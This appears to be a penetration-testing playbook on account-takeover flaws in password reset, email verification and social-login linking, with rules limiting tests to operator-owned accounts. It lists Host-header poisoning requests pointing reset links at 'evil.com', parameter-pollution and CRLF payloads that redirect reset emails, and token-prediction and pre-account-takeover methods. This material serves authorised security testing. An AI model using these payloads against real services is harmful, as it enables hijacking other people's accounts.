# Password Reset Arsenal, Account Linking & Pre-Account Takeover

## Contents
- Invariants (each is an ATO when missing)
- A — Host-header poisoning (reset link points at attacker)
- B — Token leak via Referer / third-party resource
- C — Token via IDOR / response disclosure
- D — Token reuse / predictability / no invalidation
- E — Parameter pollution / array injection
- F — Email verification / change trust gaps
- G — Social-login / SSO linking & pre-account takeover
- Good evidence
- Ladder discipline

Use for password reset, email verification, invite acceptance, social-login /
SSO account linking, and pre-account takeover. The finding is **login as another
identity** (ATO) — a reset link that arrives is rung 0. Prove with two
operator-owned inboxes; the victim inbox in the PoC is one **you** control.

## Invariants (each is an ATO when missing)

- a reset link/token is delivered ONLY to the verified address on record, is
  single-use, short-lived, and never appears in an HTTP response/log;
- the reset link host is server-fixed, not taken from a request header;
- linking a social/SSO identity to an existing account requires proof of the
  IdP/mailbox, not just email equality;
- an account created against an unverified email cannot later capture that
  identity when it's verified elsewhere.

## A — Host-header poisoning (reset link points at attacker)

If the reset email builds the link from a request header, a victim's real reset
lands on your host. Trigger a reset **for your own second test account** and
inspect the delivered link:

```
POST /api/password/reset  Host: evil.com
POST /api/password/reset  X-Forwarded-Host: evil.com
POST /api/password/reset  X-Forwarded-Host: evil.com   Host: app.target.com
POST /api/password/reset  X-Host: evil.com  /  X-Forwarded-Server: evil.com
POST /api/password/reset  Host: app.target.com  X-Forwarded-Host: evil.com
# dangling-markup / two Host values, and absolute-URL in path:
GET https://evil.com/reset  Host: app.target.com
```

Win = the email link's origin is `evil.com` (or the token is appended to your
host). When the victim clicks, the `?token=` hits your server -> you complete the
reset -> ATO. Prove the poisoned link on **your own** inbox; state victim impact
by inference. Do not send poisoned resets to real users.

## B — Token leak via Referer / third-party resource

The reset **landing page** carries the token in its URL and loads an off-origin
resource (analytics, CDN, ad, an `<img>`/`<a>` to attacker). The browser sends
the full URL (with token) in the `Referer` to that third party.

- Load the reset page, watch outbound requests for the token in `Referer`.
- If the page has any attacker-influenced link/image, the token leaks on click.
- Also check the token in the browser **history**, in `window.name`, or posted to
  a logging endpoint. Any off-origin egress of the token = leak -> ATO.

## C — Token via IDOR / response disclosure

The reset token is retrievable through the API rather than only via email:

- `GET /api/users/{id}/reset-token`, `GET /api/password/reset?email=victim` echoes
  the token/link in the JSON;
- the "reset requested" response body contains `{"token":...}` or a full link;
- a support/admin endpoint returns pending reset tokens;
- the token is embedded in a subsequent page's HTML/JS state.

Fetch the token for **your own second account** to prove disclosure, then use it.
Combine with an IDOR primitive (`idor-bola`): read the victim's token -> reset -> ATO.

## D — Token reuse / predictability / no invalidation

- **Reuse**: complete a reset, then use the *same* token again -> accepted = not
  single-use.
- **No invalidation**: an old reset token still works after a newer one is issued,
  or after login/password change.
- **No expiry**: a token from hours/days ago is accepted.
- **Predictable**: token is sequential, a timestamp, `md5(email)`, `base64(email
  + counter)`, or a short numeric OTP — derive it for your second account and use
  it (no brute force; derive/observe the algorithm).
- **Token not bound to the account** — a valid token from *your* reset completes a
  reset for a *different* account (submit your token + victim's id). Own-context.

## E — Parameter pollution / array injection

Make the reset target both the victim and you, or swap the recipient without the
email check:

```
email=victim@target.com&email=attacker@you.com
{"email":["victim@target.com","attacker@you.com"]}
{"email":"victim@target.com","deliveryEmail":"attacker@you.com"}
email=victim@target.com%0acc:attacker@you.com          (CRLF/header inject)
email=victim@target.com&user_id=<attacker-id>          (id overrides email)
```

Win = the reset link/token is delivered to, or accepted for, an address you
control. Prove with your two accounts.

## F — Email verification / change trust gaps

- **Unverified email accepts reset/invite** — register with an email you don't
  own being unverified, and still get a reset/invite that grants access.
- **Email change without re-verify** — change your account email to a victim's
  address and the app treats you as that identity (or an unverified new email is
  immediately trusted for login/reset).
- **Verify-token reuse across accounts** — one verification token confirms a
  different email.

## G — Social-login / SSO linking & pre-account takeover

- **Pre-account takeover**: register a password account with `victim@target.com`
  **before** the victim signs up. When the victim later uses "Sign in with
  Google/SSO", the provider's email matches and the app **links to your
  pre-created account** instead of creating a new one -> you both own it, or your
  password still works. Prove with two controlled identities (your second
  mailbox as the "victim").
- **Email-equality linking**: social login attaches to an existing account on
  email match alone, with no mailbox/IdP proof — link your IdP to a target
  account you pre-seeded.
- **Unverified-email OAuth**: the IdP returns `email_verified:false` (or omits it)
  and the app still trusts the email — mint an IdP identity with an arbitrary
  unverified email and log in as it.

## Good evidence

- reset link delivered to an operator-controlled host via Host/XFH poisoning;
- reset token echoed in an API response or leaked via Referer/history;
- old/used/predictable/cross-account reset token accepted -> login as the target;
- array/param pollution delivers the token to an attacker address;
- social/SSO login binds to a pre-created account without mailbox/IdP proof ->
  login as the target;
- negative control: the canonical reset (fixed host, single-use token) enforces.

## Ladder discipline

Two operator-owned inboxes/identities only. Never send poisoned resets, invites,
or verification to a real third party; never guess employee emails. The "victim"
in every PoC is your second controlled account — that fully proves the class.
Completing a reset that changes a password is a state change on your **own** test
account (fine); doing it to a real account = ask d0x directly before executing.
